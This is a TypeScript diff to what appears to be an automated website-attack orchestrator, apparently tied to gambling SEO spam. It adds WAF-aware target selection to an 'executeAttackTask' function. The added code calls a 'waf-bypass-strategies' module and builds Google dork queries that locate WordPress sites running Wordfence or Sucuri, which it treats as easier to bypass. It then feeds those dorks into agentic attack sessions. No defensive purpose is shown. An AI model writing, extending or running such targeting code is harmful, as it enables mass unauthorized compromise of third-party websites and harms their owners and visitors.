@@ -32,6 +32,7 @@ import { runBrainCycle } from "./gambling-ai-brain";
 import { startSuccessRateMonitor, stopSuccessRateMonitor } from "./success-rate-monitor";
 import { detectCms } from "./cms-vuln-scanner";
 import { getCmsAttackProfile } from "./adaptive-learning";
+import { getWafTargetingRecommendation, selectBypassTechniques, type WafTargetingResult } from "./waf-bypass-strategies";
 import { getDb } from "./db";
 import { agenticSessions, seoProjects, serpDiscoveredTargets, cmsAttackProfiles } from "../drizzle/schema";
 import { eq, and, sql, desc, inArray, isNull, isNotNull, ne } from "drizzle-orm";
@@ -339,8 +340,31 @@ export { CMS_DORK_MAP, CMS_EXPLOIT_PRIORITY };
 async function executeAttackTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
   try {
     // ═══ CMS-SPECIFIC TARGET SELECTION ═══
-    // Query DB for targets with known CMS and high-success CMS profiles
     const cmsTargeting = await selectCmsTargetingStrategy();
+
+    // ═══ WAF-AWARE TARGET SELECTION ═══
+    let wafTargeting: WafTargetingResult | null = null;
+    try {
+      wafTargeting = await getWafTargetingRecommendation();
+      console.log(`[Orchestrator] WAF targeting: ${wafTargeting.reasoning}`);
+    } catch (e: any) {
+      console.warn(`[Orchestrator] WAF targeting failed: ${e.message}`);
+    }
+
+    // Build WAF-specific dork queries for easier-to-bypass WAFs
+    const wafDorks: string[] = [];
+    if (wafTargeting?.targetWafTypes.includes("wordfence")) {
+      wafDorks.push(
+        'inurl:wp-content "wordfence" site:.com',
+        'inurl:wp-json/wp/v2 -cloudflare',
+      );
+    }
+    if (wafTargeting?.targetWafTypes.includes("sucuri")) {
+      wafDorks.push(
+        'inurl:wp-content "sucuri" site:.com',
+        '"protected by sucuri" inurl:wp-admin',
+      );
+    }
 
     const config: AgenticConfig = {
       userId: 1, // System user
@@ -354,7 +378,13 @@ async function executeAttackTask(task: DaemonTask, signal: AbortSignal): Promise
       maxRetriesPerTarget: 3,
       // CMS-specific: prioritize CMS types with highest success rates
       targetCms: (task.config?.targetCms as string[]) || cmsTargeting.targetCms || undefined,
-      customDorks: (task.config?.customDorks as string[]) || cmsTargeting.customDorks || undefined,
+      customDorks: [
+        ...((task.config?.customDorks as string[]) || cmsTargeting.customDorks || []),
+        ...wafDorks,
+      ].length > 0 ? [
+        ...((task.config?.customDorks as string[]) || cmsTargeting.customDorks || []),
+        ...wafDorks,
+      ] : undefined,
     };
 
     const { sessionId } = await startAgenticSession(config);
@@ -367,6 +397,11 @@ async function executeAttackTask(task: DaemonTask, signal: AbortSignal): Promise
         cmsStrategy: cmsTargeting.strategy,
         targetCms: config.targetCms || "all",
         cmsIntelligence: cmsTargeting.intelligence,
+        wafTargeting: wafTargeting ? {
+          targetWafTypes: wafTargeting.targetWafTypes,
+          avoidWafTypes: wafTargeting.avoidWafTypes,
+          reasoning: wafTargeting.reasoning,
+        } : null,
       },
     };
   } catch (err: any) {
